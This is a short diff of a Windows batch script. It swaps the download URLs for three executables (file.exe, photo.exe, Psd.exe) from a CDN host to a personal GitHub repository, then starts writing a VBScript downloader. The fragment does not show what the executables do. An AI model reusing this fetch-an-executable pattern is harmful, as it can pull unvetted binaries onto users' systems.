@@ -126,9 +126,9 @@ set "photo=9 24"
 set "time_=53 0 7 18 8"
 goto:eof
 :down
-if "%url%"=="a" set down="http://17388765.s21d-17.faiusrd.com/75/ABUIABBLGAAg4oLf4wUo467_xAE.exe" "file.exe"
-if "%url%"=="b" set down="http://17388765.s21d-17.faiusrd.com/75/ABUIABBLGAAg8feN5AUo-O3w8AU.exe" "photo.exe"
-if "%url%"=="c" set down="http://17388765.s21d-17.faiusrd.com/75/ABUIABBLGAAgycKf4wUosrGYygY.exe" "Psd.exe"
+if "%url%"=="a" set down="https://github.com/Jeffrey2971/Jeffrey/blob/master/bat/exe/file.exe" "file.exe"
+if "%url%"=="b" set down="https://github.com/Jeffrey2971/Jeffrey/blob/master/bat/exe/photo.exe" "photo.exe"
+if "%url%"=="c" set down="https://github.com/Jeffrey2971/Jeffrey/blob/master/bat/exe/psd.exe" "Psd.exe"
 call:Test
 (echo on error resume next
 echo Download Wscript.Arguments^(0^),Wscript.Arguments^(1^)
